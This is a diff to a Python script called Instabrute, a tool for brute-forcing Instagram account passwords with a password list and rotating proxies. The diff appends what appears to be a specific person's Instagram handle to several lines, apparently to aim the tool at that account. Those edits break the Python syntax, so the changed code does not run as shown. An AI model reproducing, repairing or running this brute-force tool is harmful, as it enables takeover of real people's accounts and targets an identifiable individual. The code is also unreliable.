@@ -25,7 +25,7 @@ def Input(text):
 #The main class
 class Instabrute():
 	def __init__(self, username, passwordsFile='pass.txt'):
-		self.username = username
+		self.username = username @furkan.cnr.58
 		self.CurrentProxy = ''
 		self.UsedProxys = []
 		self.passwordsFile = passwordsFile
@@ -77,9 +77,9 @@ class Instabrute():
 
 	#Check if username exists in instagram server
 	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) @furkan.cnr.58
 		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
+			print ('[*] User named "%s" not found' % username) @furkan.cnr.58
 			Input('[*] Press enter to exit')
 			exit()
 		elif (r.status_code == 200):
@@ -139,7 +139,7 @@ class Instabrute():
 
 
 
-instabrute = Instabrute(Input('Please enter a username: '))
+instabrute = Instabrute(Input('Please enter a username: ')) @furkan.cnr.58
 
 try:
 	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
